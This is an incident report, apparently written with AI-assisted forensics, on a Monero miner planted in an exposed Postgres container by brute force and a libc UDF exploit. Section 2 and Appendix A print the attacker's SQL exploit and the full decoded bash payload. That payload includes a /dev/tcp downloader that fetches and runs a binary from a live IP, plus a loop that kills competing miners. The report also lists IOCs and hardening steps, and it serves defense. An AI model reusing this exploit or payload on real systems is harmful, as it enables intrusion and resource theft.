# Security Incident Report: Cryptocurrency Miner in Docker Container

**Document Classification:** Internal -- Security Sensitive
**Incident ID:** SEC-2026-0226
**Date of Report:** February 26, 2026
**Investigation Performed By:** Claude Code (AI-assisted forensic analysis)
**Status:** Resolved -- Root cause remediation pending

---

## Executive Summary

On February 26, 2026, a cryptocurrency miner was discovered running inside the `sg-postgres` Docker container on a development machine. The container, running `postgres:16-alpine`, had its PostgreSQL port exposed to the public internet with a default password. An automated botnet exploited this misconfiguration to deploy a Monero (XMR) cryptominer consuming 316% CPU and 2.3 GB of RAM.

The attack was part of the **PG_MEM / Kinsing** cryptojacking campaign family, one of the most widespread automated operations targeting exposed database services. The attacker first probed the container just 23 minutes after it was created, indicating continuous automated scanning of the IPv4 address space.

**Key findings:**
- The attack vector was a PostgreSQL port bound to `0.0.0.0:15432` (all network interfaces) combined with the default password `postgres`.
- 477 brute-force login attempts were logged using 20+ framework-associated usernames.
- The miner was deployed via a PostgreSQL User-Defined Function (UDF) exploit that loaded C functions from libc to execute arbitrary shell commands.
- Two malicious binaries were dropped: a Rust-based dropper/C2 agent (`init`) and an XMRig-fork Monero miner (`mysql`).
- Container isolation prevented host filesystem access and container escape, limiting impact to CPU/RAM consumption.
- **This is the second occurrence of this attack on this machine.** The root cause has not yet been permanently resolved.

---

## Table of Contents

1. [Incident Timeline](#1-incident-timeline)
2. [Attack Vector Analysis](#2-attack-vector-analysis)
3. [Malware Analysis](#3-malware-analysis)
4. [Container Security Assessment](#4-container-security-assessment)
5. [Attack Classification](#5-attack-classification)
6. [Indicators of Compromise (IOCs)](#6-indicators-of-compromise-iocs)
7. [Remediation Actions Taken](#7-remediation-actions-taken)
8. [Recommendations](#8-recommendations)
9. [Appendices](#9-appendices)

---

## 1. Incident Timeline

| Timestamp (UTC) | Event | Significance |
|---|---|---|
| **Feb 13, 2026 15:00** | Container `sg-postgres` created from `postgres:16-alpine` image | Container deployed with port exposed to all interfaces |
| **Feb 13, 2026 15:23** | First attack attempt detected (23 minutes post-creation) | Attacker attempted PostgreSQL UDF exploit using `CREATE FUNCTION system(cstring)` via `/lib/x86_64-linux-gnu/libc.so.6`. Failed because Alpine uses musl libc, not glibc. |
| **Feb 13 -- Feb 26** | Repeated attack attempts every ~39 minutes | Automated persistence mechanism re-executing the exploit payload at regular intervals |
| **Feb 26, 2026 11:11** | Massive brute-force wave begins | 477 password authentication failures logged across 20+ different usernames |
| **Feb 26, 2026 11:46** | Miner successfully deployed and running | Attacker gains code execution; dropper and miner binaries written to `/tmp` |
| **Feb 26, 2026 14:48** | Anomalous CPU usage detected | Routine system check reveals excessive resource consumption |
| **Feb 26, 2026 ~15:00** | Investigation completed; container stopped and removed | Forensic analysis performed; miner processes killed; container destroyed |

### Key Observation

The 23-minute gap between container creation and the first attack attempt confirms that automated botnets are continuously scanning the public internet for newly exposed database services. The 13-day window between initial compromise attempts and successful miner deployment suggests the attacker's payload was designed for glibc-based systems and eventually succeeded through an alternative execution path or payload variant.

---

## 2. Attack Vector Analysis

### 2.1 Entry Point

| Parameter | Value |
|---|---|
| **Container** | `sg-postgres` (ID: `27fd9c21590e`) |
| **Image** | `postgres:16-alpine` |
| **Exposed port** | `5432 -> 0.0.0.0:15432` |
| **Binding** | All network interfaces (publicly accessible) |
| **Password** | `POSTGRES_PASSWORD=postgres` (default/weak) |
| **Database** | `securityguard` |

The critical misconfiguration was the port binding to `0.0.0.0`, which made PostgreSQL accessible from any network interface, including the public internet. Combined with the default password `postgres`, this provided trivial access for any automated scanner.

### 2.2 Brute-Force Phase

A total of **477 failed login attempts** were recorded, using usernames commonly associated with popular web frameworks and database tools. This is a hallmark of automated botnet dictionary attacks.

**Username frequency distribution:**

| Username | Attempts | | Username | Attempts |
|---|---|---|---|---|
| `postgres` | 157 | | `wordpress` | 4 |
| `supabase` | 10 | | `typeorm` | 4 |
| `app` | 10 | | `sqlalchemy` | 4 |
| `root` | 8 | | `springboot` | 4 |
| `superset` | 6 | | `spring` | 4 |
| `strapi` | 6 | | `spree` | 4 |
| `prisma` | 6 | | `sidekiq` | 4 |
| `django` | 6 | | `shopware` | 4 |
| | | | `redash` | 4 |
| | | | `rails` | 4 |
| | | | `quarkus` | 4 |
| | | | `prometheus` | 4 |

Additional usernames observed: `magento`, `prestashop`, `erpnext`, `postgresml`, and others. The breadth of usernames indicates a scanning tool designed to target the full spectrum of applications that commonly use PostgreSQL as a backend.

### 2.3 Exploitation Phase

Once authenticated, the attacker exploited PostgreSQL's ability to load C functions from shared libraries to achieve arbitrary command execution on the host operating system (within the container).

**Step 1 -- Create a UDF for shell command execution:**

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
  AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
  LANGUAGE 'c' STRICT;
```

This registers the C standard library's `system()` function as a PostgreSQL callable function, enabling arbitrary command execution from SQL.

**Step 2 -- Execute base64-encoded payload:**

```sql
SELECT system('<base64-encoded payload>|base64 -d|bash');
```

The payload was base64-encoded to avoid detection and special character issues in the SQL transport layer.

### 2.4 Decoded Payload Analysis

The decoded bash payload performed four distinct operations:

#### Operation 1: Pure-Bash HTTP Client

```bash
function __curl() {
  read proto server path <<<"$(printf '%s' "$1" | sed 's#://# #;s#/# #')"
  DOC="/$path"
  HOST="${server%%:*}"
  PORT="${server##*:}"
  [ "$HOST" = "$PORT" ] && PORT=80
  exec 3<>/dev/tcp/$HOST/$PORT
  printf "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" "$DOC" "$HOST" >&3
  while IFS= read -r line <&3; do
    line=${line%$'\r'}
    [ -z "$line" ] && break
  done
  cat <&3
  exec 3>&-
}
```

This function implements an HTTP client using bash's `/dev/tcp` pseudo-device, eliminating the dependency on `curl` or `wget`, which may not be present in minimal container images like Alpine.

#### Operation 2: Kill Competing Miners

```bash
for pid in /proc/[0-9]*; do
  pid=${pid##*/}
  result=$(ls -l /proc/$pid/exe)
  case $result in
    *"/tmp/watchdog"*|*"/var/Sofia"*|*"mcrnlhoy"*|*"pg_mem"*|*"x86"*|\
    *"memfd"*|*".metabase"*|*"cat"*|*"/tmp/."*|*"/tmp/.r.rpk/"*|\
    *"javavm64"*|*"httpd"*|*"dockerd"*|*"rediserver"*|*"dash"*|\
    *"kinsing"*|*"kdevtmpfsi"*|*"/tmp/.perf.c/"*|*"/tmp/ccrl"*|\
    *"/tmp/httpd"*|*"postmaster"*)
      kill -9 $pid ;;
  esac
done
```

This targets **18+ known cryptocurrency miner process names** from competing campaigns, including:
- `watchdog`, `kinsing`, `kdevtmpfsi` (well-known cryptojacking malware)
- `pg_mem` (PostgreSQL-specific miner variant)
- `Sofia`, `mcrnlhoy`, `ccrl` (lesser-known variants)
- `javavm64`, `.metabase` (disguised as legitimate services)
- `postmaster` (note: uses Cyrillic character 'o' to distinguish from the real PostgreSQL postmaster process)

#### Operation 3: Avoid Re-infection

```bash
for p in /proc/[0-9]*; do
  pid=${p##*/}
  exe=$(ls -l /proc/$pid/exe 2>/dev/null)
  case "$exe" in *"init"*) exit ;; esac
done
```

Checks if the dropper (`init`) is already running. If so, the script exits to prevent duplicate infections.

#### Operation 4: Download and Execute Miner

```bash
__curl http://185.186.25.120/bot > /tmp/bot && chmod +x /tmp/bot && cd /tmp; ./bot database1;
```

Downloads the miner binary from a bare IP address, saves it to `/tmp/bot`, makes it executable, and launches it with the argument `database1` (likely a pool/campaign identifier).

---

## 3. Malware Analysis

### 3.1 Dropped Files

| Attribute | Dropper | Miner |
|---|---|---|
| **Path** | `/tmp/init` | `/tmp/mysql` |
| **Size** | 2.7 MB | 1.9 MB |
| **Packer** | UPX | UPX |
| **Language** | Rust (tokio 1.48.0 async runtime) | C/C++ (XMRig fork) |
| **SHA-256** | `8aa79abe278f2d1b6d97b5a297db83a834e68678fa2072f90b4d11669284027a` | `77d764ced0a7bcac8814aaa2a08a1d11762f3c702eb06b77b6388d3f279951a8` |
| **Role** | Dropper / C2 agent | Monero (XMR) cryptocurrency miner |
| **Disguised as** | Linux init process | MySQL database server |

Both binaries were UPX-packed to reduce file size and hinder static analysis. The naming convention (`init`, `mysql`) was deliberately chosen to appear as legitimate system processes in process listings.

### 3.2 Active Network Connections at Time of Discovery

| Process | PID | Local Address | Remote Address | Purpose |
|---|---|---|---|---|
| `init` (dropper) | 162911 | `172.27.0.4:40362` | `5.255.115.190:48996` | Command and Control (C2) |
| `mysql` (miner) | 163171 | `172.27.0.4:56324` | `5.255.106.100:44999` | Mining pool connection |

Both remote IP addresses are in the `5.255.x.x` range, associated with Russian hosting infrastructure. The initial binary download originated from a separate IP: `185.186.25.120`.

### 3.3 Process Forensics

| Attribute | Value |
|---|---|
| **Miner PID** | 163171 |
| **Dropper PID** | 162911 (parent) |
| **Running as** | UID 70 / GID 70 (`postgres` user inside container) |
| **CPU usage** | 316% (utilizing 3+ CPU cores) |
| **Memory (RSS)** | 2.3 GB (2,406,524 KB) |
| **Thread count** | 10 |
| **Context switches** | 37,949 |
| **Uptime at discovery** | ~3 hours |
| **Total CPU time consumed** | 578+ minutes |
| **stdin/stdout/stderr** | All redirected to `/dev/null` (silent operation) |
| **Mining algorithm** | RandomX (Monero) |
| **String evidence** | `kXMR`, `POOL` found in binary strings |

The 2.3 GB memory footprint is characteristic of RandomX, Monero's mining algorithm, which requires a large dataset to be held in RAM. The two `rwx` (read-write-execute) memory regions detected in the process memory maps correspond to JIT-compiled RandomX mining code.

### 3.4 Persistence Mechanism

The attack payload was re-executed approximately every **39 minutes** via the PostgreSQL UDF exploit, as evidenced by repeated `libc.so.6` error messages in the container logs spanning the entire Feb 13--26 period. The dropper's self-check mechanism (Operation 3 in the payload) prevented duplicate infections when the payload was re-triggered.

---

## 4. Container Security Assessment

### 4.1 Security Configuration Audit

| Security Control | Configured Value | Risk Level | Notes |
|---|---|---|---|
| Privileged mode | `false` | **OK** | Container cannot access host devices |
| Host PID namespace | Isolated | **OK** | Container has its own PID namespace |
| Host filesystem mounts | Single file bind-mount only | **OK** | No broad host filesystem access |
| `/root` accessible from container | No | **OK** | Host home directory not exposed |
| Read-only rootfs | `false` | **HIGH** | Allowed attacker to write binaries to `/tmp` |
| Seccomp profile | Enabled (default) | **OK** | Restricts dangerous syscalls |
| `SYS_ADMIN` capability | Not granted | **OK** | Prevents container escape via namespace manipulation |
| Network isolation | `securityguard_sg-network` (Docker bridge) | **MEDIUM** | Could pivot to sibling containers on same network |
| Port binding | `0.0.0.0:15432` | **CRITICAL** | Exposed PostgreSQL to the public internet |
| Database password | `postgres` (default) | **CRITICAL** | Trivially guessable credential |
| `log_connections` | `off` | **HIGH** | No audit trail for connection attempts |
| `log_statement` | `none` | **HIGH** | No audit trail for SQL execution |

### 4.2 Host Impact Assessment

| Impact Category | Affected? | Details |
|---|---|---|
| Host filesystem access | **No** | Container isolation prevented access to `/root`, `/home`, and source code |
| Container escape | **No** | No privileged mode, no `SYS_ADMIN` capability |
| CPU consumption | **Yes** | 316% CPU (3+ cores consumed by miner) |
| RAM consumption | **Yes** | 2.3 GB consumed by RandomX dataset |
| Lateral movement risk | **Possible** | Miner could scan/attack other containers on `securityguard_sg-network` |
| Data exfiltration | **Unknown** | The `securityguard` database contents may have been accessed; no logging was enabled |

---

## 5. Attack Classification

### 5.1 Campaign Family

This attack is a variant of the **PG_MEM / Kinsing** campaign family, one of the most widespread automated cryptojacking operations targeting exposed database services on the internet.

### 5.2 Identifying Signatures

| Signature | Present |
|---|---|
| PostgreSQL `CREATE FUNCTION system()` using libc.so.6 as C UDF | Yes |
| Base64-encoded bash payload delivered via SQL | Yes |
| Pure-bash HTTP client using `/dev/tcp` (no curl/wget dependency) | Yes |
| Kills 18+ competing miners by process name | Yes |
| Downloads binary from bare IP address (no domain) | Yes |
| Renames binaries to mimic legitimate services (`mysql`, `init`) | Yes |
| Targets Monero (privacy-focused, untraceable cryptocurrency) | Yes |
| UPX-packed Rust dropper with tokio async runtime | Yes |
| Automated scanning -- hit container 23 minutes after creation | Yes |

### 5.3 Scale and Context

- **Shodan** reports approximately **1.5 million exposed PostgreSQL instances** on the public internet.
- Automated botnets continuously scan the entire IPv4 address space for database ports: `5432` (PostgreSQL), `3306` (MySQL), `27017` (MongoDB), `6379` (Redis), `2375` (Docker API).
- Security researchers estimate **thousands of new compromises daily** from campaigns of this type.
- The breadth of usernames in the brute-force phase (django, rails, strapi, prisma, supabase, wordpress, magento, shopware, etc.) indicates a highly mature scanning toolkit designed to target every major web framework's default database configuration.

---

## 6. Indicators of Compromise (IOCs)

### 6.1 File Hashes (SHA-256)

| File | SHA-256 Hash |
|---|---|
| Miner (`/tmp/mysql`) | `77d764ced0a7bcac8814aaa2a08a1d11762f3c702eb06b77b6388d3f279951a8` |
| Dropper (`/tmp/init`) | `8aa79abe278f2d1b6d97b5a297db83a834e68678fa2072f90b4d11669284027a` |

### 6.2 Network IOCs

| IP Address | Port | Role |
|---|---|---|
| `185.186.25.120` | 80 (HTTP) | Initial binary download server (C2) |
| `5.255.115.190` | 48996 | Persistent C2 connection |
| `5.255.106.100` | 44999 | Mining pool connection |

### 6.3 File System IOCs

| Path | Description |
|---|---|
| `/tmp/mysql` | Disguised XMRig-fork Monero miner (1.9 MB, UPX packed) |
| `/tmp/init` | Rust-based dropper/C2 agent (2.7 MB, UPX packed) |
| `/tmp/bot` | Initial download filename (renamed to `init`/`mysql` post-execution) |

### 6.4 PostgreSQL IOCs

- **SQL pattern:** `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6'`
- **Log signature:** `could not access file "/lib/x86_64-linux-gnu/libc.so.6": No such file or directory` (recurring every ~39 minutes)
- **Brute-force usernames:** `postgres`, `django`, `rails`, `strapi`, `prisma`, `supabase`, `wordpress`, `magento`, `shopware`, `superset`, `typeorm`, `sqlalchemy`, `springboot`, `sidekiq`, `redash`, `quarkus`, `prometheus`, `erpnext`, `postgresml`

---

## 7. Remediation Actions Taken

The following actions were performed immediately upon discovery:

1. **Miner processes killed** -- PID 163171 (`mysql` miner) and PID 162911 (`init` dropper) terminated with `kill -9`.
2. **Compromised container stopped and removed** -- `sg-postgres` (container ID `27fd9c21590e`) was stopped via `docker stop` and removed via `docker rm`.
3. **Host process verification** -- Confirmed no miner processes remained running on the host system outside the container.

---

## 8. Recommendations

### 8.1 Immediate (MUST complete before restarting the container)

**R1. Bind PostgreSQL to localhost only**

Change the port mapping from:
```yaml
ports:
  - "15432:5432"        # INSECURE: binds to 0.0.0.0 (all interfaces)
```
To:
```yaml
ports:
  - "127.0.0.1:15432:5432"   # SECURE: binds to localhost only
```

**R2. Use a strong, randomly generated password**

Replace `POSTGRES_PASSWORD=postgres` with a randomly generated password of 32+ characters:
```bash
# Generate a strong password
openssl rand -base64 32
```

**R3. Make the container filesystem read-only**

Prevent malware from writing binaries to the filesystem:
```yaml
read_only: true
tmpfs:
  - /tmp:noexec,nosuid,size=64m
  - /run:noexec,nosuid,size=64m
```

The `noexec` mount option on `/tmp` is critical -- it prevents execution of any binaries written to temporary directories, which would have blocked this specific attack entirely.

**R4. Enable PostgreSQL audit logging**

```ini
log_connections = on
log_disconnections = on
log_statement = 'ddl'
log_line_prefix = '%m [%p] %u@%d '
```

This ensures that future connection attempts, disconnections, and DDL statements (including `CREATE FUNCTION`) are recorded for forensic analysis.

### 8.2 Short-Term (complete within 1 week)

**R5. Audit ALL Docker containers for exposed ports**

Identify every container with ports bound to `0.0.0.0`:
```bash
docker ps --format '{{.Names}}: {{.Ports}}' | grep '0.0.0.0'
```

Any database service (PostgreSQL, MySQL, MongoDB, Redis) bound to all interfaces should be immediately restricted to `127.0.0.1`.

**R6. Add host-level firewall rules**

Configure `ufw` or `iptables` to block inbound connections to database ports from external IP addresses:
```bash
# Example: block external access to common database ports
ufw deny in from any to any port 5432 proto tcp
ufw deny in from any to any port 3306 proto tcp
ufw deny in from any to any port 27017 proto tcp
ufw deny in from any to any port 6379 proto tcp
```

**R7. Scan the named volume for backdoors**

The Docker volume `securityguard_postgres_data` may contain backdoor SQL functions, modified system catalogs, or corrupted data. Before reusing the volume:
- Mount it to a fresh PostgreSQL container in read-only mode
- Inspect `pg_proc` for any suspicious user-defined functions (especially those referencing `libc.so.6` or similar shared libraries)
- Verify data integrity

**R8. Check sibling containers for lateral movement**

Inspect all containers on the `securityguard_sg-network` Docker bridge network for:
- Unexpected processes
- Unusual network connections
- Modified files in writable directories

### 8.3 Long-Term (complete within 1 month)

**R9. Use Docker secrets for credential management**

Replace environment variables with Docker secrets:
```yaml
secrets:
  postgres_password:
    file: ./secrets/postgres_password.txt

services:
  postgres:
    secrets:
      - postgres_password
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/postgres_password
```

**R10. Deploy a reverse proxy with IP allowlisting**

For any service that must be remotely accessible, place it behind a reverse proxy (Nginx, Traefik) with:
- IP allowlisting
- TLS encryption
- Rate limiting
- Authentication

**R11. Implement container runtime monitoring**

Deploy a container security tool such as:
- **Falco** -- Runtime threat detection for containers
- **Sysdig** -- Container monitoring and forensics

These tools can detect anomalous processes (e.g., a cryptocurrency miner) inside containers in real time and trigger automated responses.

**R12. Implement network segmentation**

Use Docker network policies or a service mesh to:
- Prevent containers from making arbitrary outbound connections
- Restrict inter-container communication to only necessary paths
- Block outbound connections to known mining pool ports

**R13. Establish regular security audit schedule**

- Monthly scan for exposed services using internal and external port scans
- Quarterly review of Docker configurations, secrets management, and network policies
- Automated alerting for containers with ports bound to `0.0.0.0`

---

## 9. Appendices

### Appendix A: Full Decoded Attack Payload

```bash
function __curl() {
  read proto server path <<<"$(printf '%s' "$1" | sed 's#://# #;s#/# #')"
  DOC="/$path"
  HOST="${server%%:*}"
  PORT="${server##*:}"
  [ "$HOST" = "$PORT" ] && PORT=80
  exec 3<>/dev/tcp/$HOST/$PORT
  printf "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" "$DOC" "$HOST" >&3
  while IFS= read -r line <&3; do
    line=${line%$'\r'}
    [ -z "$line" ] && break
  done
  cat <&3
  exec 3>&-
}

for pid in /proc/[0-9]*; do
  pid=${pid##*/}
  result=$(ls -l /proc/$pid/exe)
  case $result in
    *"/tmp/watchdog"*|*"/var/Sofia"*|*"mcrnlhoy"*|*"pg_mem"*|*"x86"*|\
    *"memfd"*|*".metabase"*|*"cat"*|*"/tmp/."*|*"/tmp/.r.rpk/"*|\
    *"javavm64"*|*"httpd"*|*"dockerd"*|*"rediserver"*|*"dash"*|\
    *"kinsing"*|*"kdevtmpfsi"*|*"/tmp/.perf.c/"*|*"/tmp/ccrl"*|\
    *"/tmp/httpd"*|*"postmaster"*)
      kill -9 $pid ;;
  esac
done

for p in /proc/[0-9]*; do
  pid=${p##*/}
  exe=$(ls -l /proc/$pid/exe 2>/dev/null)
  case "$exe" in *"init"*) exit ;; esac
done

__curl http://185.186.25.120/bot > /tmp/bot && chmod +x /tmp/bot && cd /tmp; ./bot database1;
```

### Appendix B: Competing Miners Targeted for Termination

The payload kills processes matching the following 18+ patterns, representing known cryptojacking malware families:

| Process Name/Path | Known Campaign |
|---|---|
| `/tmp/watchdog` | Watchdog cryptojacking |
| `/var/Sofia` | Sofia miner variant |
| `mcrnlhoy` | Unknown/obfuscated miner |
| `pg_mem` | PostgreSQL-targeting miner |
| `x86` | Generic miner name |
| `memfd` | Fileless miner (memfd_create) |
| `.metabase` | Disguised as Metabase |
| `cat` | Disguised as common utility |
| `/tmp/.` (hidden files) | Various hidden miners |
| `/tmp/.r.rpk/` | RPK miner variant |
| `javavm64` | Disguised as Java VM |
| `httpd` | Disguised as Apache |
| `dockerd` | Disguised as Docker daemon |
| `rediserver` | Redis-targeting miner |
| `dash` | Disguised as dash shell |
| `kinsing` | Kinsing malware family |
| `kdevtmpfsi` | Kinsing companion miner |
| `/tmp/.perf.c/` | Hidden performance miner |
| `/tmp/ccrl` | CCRL miner variant |
| `postmaster` (Cyrillic) | Disguised as PostgreSQL (uses Cyrillic 'o') |

### Appendix C: Container Identification Details

| Attribute | Value |
|---|---|
| Container name | `sg-postgres` |
| Container ID | `27fd9c21590e` |
| Image | `postgres:16-alpine` |
| Network | `securityguard_sg-network` |
| Container IP | `172.27.0.4` |
| Port mapping | `0.0.0.0:15432 -> 5432/tcp` |
| Volume | `securityguard_postgres_data` |

---

## Recurrence Warning

**This is the second time this attack has occurred on this machine.** The prior incident also entered through an internet-exposed PostgreSQL service. The root cause -- a database port bound to all interfaces with a weak password -- must be **permanently resolved** before any PostgreSQL container is restarted. Failure to implement at minimum recommendations R1 (localhost binding) and R2 (strong password) will result in re-compromise, likely within minutes.

---

*Report generated: February 26, 2026*
*Investigation performed by: Claude Code (AI-assisted forensic analysis)*
